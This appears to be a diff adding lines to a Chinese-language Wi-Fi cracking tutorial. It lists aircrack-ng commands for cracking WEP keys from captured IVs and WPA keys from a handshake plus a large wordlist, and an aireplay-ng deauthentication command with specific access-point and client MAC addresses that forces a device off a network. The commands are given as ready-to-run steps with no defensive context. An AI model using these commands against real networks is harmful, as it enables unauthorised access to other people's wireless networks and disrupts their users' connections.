@@ -42,5 +42,13 @@ mon0为之前已经载入并激活监听模式的无线网卡。如下图8所示
 图11
 airodump-ng -c 6  -w <文件名> --ivs mon0
 
+#aircrack-ng  *.ivs 
+破解 web加密,需要iv2万左右
+#aircrack-ng  -w 字典文件 *.ivs 
+破解 wpa加密, 一个握手包+海量字典
+
+#强制断开
+	aireplay-ng -0 1  -a 6C:E8:73:50:85:F0 -c 00:1B:77:BE:19:FC mon0
+
 
 
